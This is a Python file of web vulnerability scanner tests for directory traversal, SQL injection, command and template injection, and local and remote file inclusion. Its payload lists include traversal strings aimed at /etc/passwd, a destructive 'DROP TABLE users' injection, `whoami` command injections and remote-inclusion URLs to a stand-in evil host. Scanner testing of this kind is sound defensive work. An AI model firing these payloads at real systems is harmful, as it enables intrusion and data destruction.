from scanner import VulnerabilityTest, VulnerabilityTestResult
import requests
from urllib.parse import quote

class TestDirectoryTraversalFileInclusion(VulnerabilityTest):
    """
    Tests for directory traversal and file inclusion vulnerabilities.
    """
    async def run(self) -> VulnerabilityTestResult:
        self.log_info("Testing for directory traversal/file inclusion...")
        traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd", # Absolute path
            "C:\\windows\\win.ini" # Absolute path for windows
        ]
        vulnerable_paths = []

        for payload in traversal_payloads:
            test_url = f"{self.url}/{quote(payload)}" # URL encode payload
            try:
                response = self.session.get(test_url, timeout=10, allow_redirects=False)
                if response.status_code == 200:
                    if "root:" in response.text or "\[extensions]" in response.text.lower(): # Basic content check
                        vulnerable_paths.append(payload)
            except requests.RequestException as e:
                self.log_warning(f"Request error for payload '{payload}': {e}")

        if vulnerable_paths:
            return VulnerabilityTestResult(
                test_name="Test Directory Traversal / File Inclusion",
                severity="critical",
                description=f"Directory traversal or file inclusion vulnerability detected. Accessible paths: {vulnerable_paths}",
                recommendation="Sanitize user input, restrict file access, and implement proper path validation.",
                vulnerable=True,
                details={"vulnerable_paths": vulnerable_paths}
            )
        else:
            return VulnerabilityTestResult(
                test_name="Test Directory Traversal / File Inclusion",
                severity="low",
                description="Directory traversal and file inclusion vulnerabilities not detected.",
                recommendation="Continue to enforce secure file handling practices.",
                vulnerable=False
            )

class TestSQLInjection(VulnerabilityTest):
    """
    Tests for SQL Injection vulnerabilities.
    """
    async def run(self) -> VulnerabilityTestResult:
        self.log_info("Testing for SQL Injection...")
        # Placeholder - SQL injection testing is complex and requires targeted payloads
        # and response analysis. This is a simplified example.
        injection_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "'; DROP TABLE users; --" # Destructive payload - use with extreme caution and only on test systems!
        ]
        vulnerable_params = []
        # This is a placeholder example and needs to be adapted for real-world forms/parameters

        # Example - simplified form parameter injection (adapt to actual application)
        params_to_test = ["id", "search", "query"] # Example parameters - customize based on target

        for param in params_to_test:
            for payload in injection_payloads:
                test_params = {param: payload}
                try:
                    response = self.session.get(self.url, params=test_params, timeout=10, allow_redirects=False)
                    if response.status_code == 200:
                        if "error in your SQL syntax" in response.text.lower() or "mysql_fetch_array()" in response.text.lower(): # Basic error detection
                            vulnerable_params.append({param: payload})
                except requests.RequestException as e:
                    self.log_warning(f"Request error for parameter '{param}' with payload '{payload}': {e}")

        if vulnerable_params:
            return VulnerabilityTestResult(
                test_name="Test SQL Injection",
                severity="critical",
                description=f"Potential SQL Injection vulnerability detected in parameters: {vulnerable_params}",
                recommendation="Sanitize all user inputs, use parameterized queries or ORM, and regularly audit database interactions.",
                vulnerable=True,
                details={"vulnerable_parameters": vulnerable_params}
            )
        else:
            return VulnerabilityTestResult(
                test_name="Test SQL Injection",
                severity="low",
                description="SQL Injection vulnerabilities not detected in basic parameter testing.",
                recommendation="Conduct thorough SQL injection testing including manual and automated methods.",
                vulnerable=False
            )

# ... (Implement other injection tests similarly - NoSQL, ORM, LDAP, XML, Code Injection, RFI, etc.
#       These will require specific payloads and detection methods for each type) ...

class TestCodeInjection(VulnerabilityTest):
    """
    Tests for Code Injection vulnerabilities (e.g., command injection, server-side template injection).
    """
    async def run(self) -> VulnerabilityTestResult:
        self.log_info("Testing for Code Injection...")
        # Placeholder - Code injection testing is context-dependent and needs specific payloads
        # depending on the application language and frameworks used.
        code_injection_payloads = [
            "`whoami`", # Command injection - backticks
            "$(whoami)", # Command injection - $()
            "<% out.println(System.getProperty(\"user.name\")); %>" # JSP SSTI example
            # ... Add more SSTI payloads for different template engines (e.g., Jinja2, Twig, Freemarker)
        ]
        vulnerable_params = []
        # This is a placeholder example and needs adaptation based on application technology

        params_to_test = ["input", "name", "query"] # Example params - customize

        for param in params_to_test:
            for payload in code_injection_payloads:
                test_params = {param: payload}
                try:
                    response = self.session.get(self.url, params=test_params, timeout=10, allow_redirects=False)
                    if response.status_code == 200:
                        if "root" in response.text.lower() or "www-data" in response.text.lower() or "user.name" in response.text.lower(): # Basic output detection
                            vulnerable_params.append({param: payload})
                except requests.RequestException as e:
                    self.log_warning(f"Request error for parameter '{param}' with payload '{payload}': {e}")

        if vulnerable_params:
            return VulnerabilityTestResult(
                test_name="Test Code Injection",
                severity="critical",
                description=f"Potential Code Injection vulnerability detected in parameters: {vulnerable_params}",
                recommendation="Sanitize all user inputs, avoid using dynamic code execution, and use secure coding practices.",
                vulnerable=True,
                details={"vulnerable_parameters": vulnerable_params}
            )
        else:
            return VulnerabilityTestResult(
                test_name="Test Code Injection",
                severity="low",
                description="Code Injection vulnerabilities not detected in basic parameter testing.",
                recommendation="Conduct thorough code injection testing specific to the application's technology stack.",
                vulnerable=False
            )

class TestLocalFileInclusion(VulnerabilityTest):
    """
    Tests for Local File Inclusion (LFI) vulnerabilities.
    """
    async def run(self) -> VulnerabilityTestResult:
        # LFI tests are similar to Directory Traversal but focus on local files
        return await TestDirectoryTraversalFileInclusion(self.url).run() # Re-using Directory Traversal test for LFI for now

class TestRemoteFileInclusion(VulnerabilityTest):
    """
    Tests for Remote File Inclusion (RFI) vulnerabilities.
    """
    async def run(self) -> VulnerabilityTestResult:
        self.log_info("Testing for Remote File Inclusion...")
        rfi_payloads = [
            "http://example.com/evil.txt", # Replace example.com with a controlled domain
            "\\\\evil.share\\evil.txt" # UNC path for Windows shares (less common for web)
            # ... Add more RFI payloads as needed
        ]
        vulnerable_params = []
        # Placeholder - RFI testing requires setting up a controlled server to host malicious files

        params_to_test = ["file", "include", "page"] # Example parameters - customize

        for param in params_to_test:
            for payload in rfi_payloads:
                test_params = {param: payload}
                try:
                    response = self.session.get(self.url, params=test_params, timeout=10, allow_redirects=False)
                    if response.status_code == 200:
                        if "evil content marker" in response.text.lower(): # Detection marker on controlled evil.txt
                            vulnerable_params.append({param: payload})
                except requests.RequestException as e:
                    self.log_warning(f"Request error for parameter '{param}' with payload '{payload}': {e}")

        if vulnerable_params:
            return VulnerabilityTestResult(
                test_name="Test Remote File Inclusion",
                severity="critical",
                description=f"Potential Remote File Inclusion vulnerability detected in parameters: {vulnerable_params}",
                recommendation="Disable or strictly control file inclusion functionality, sanitize user inputs, and implement strong input validation.",
                vulnerable=True,
                details={"vulnerable_parameters": vulnerable_params}
            )
        else:
            return VulnerabilityTestResult(
                test_name="Test Remote File Inclusion",
                severity="low",
                description="Remote File Inclusion vulnerabilities not detected in basic parameter testing.",
                recommendation="Conduct thorough RFI testing, especially if file inclusion functionality is used.",
                vulnerable=False
            )

# ... (Implement Buffer Overflow, Heap Overflow, Stack Overflow, Format String, HTTP Splitting & Smuggling,
#       Host Header Injection, Error Code, Stack Traces tests. These are often more complex and require specific
#       knowledge of target application and potential underlying vulnerabilities.) ...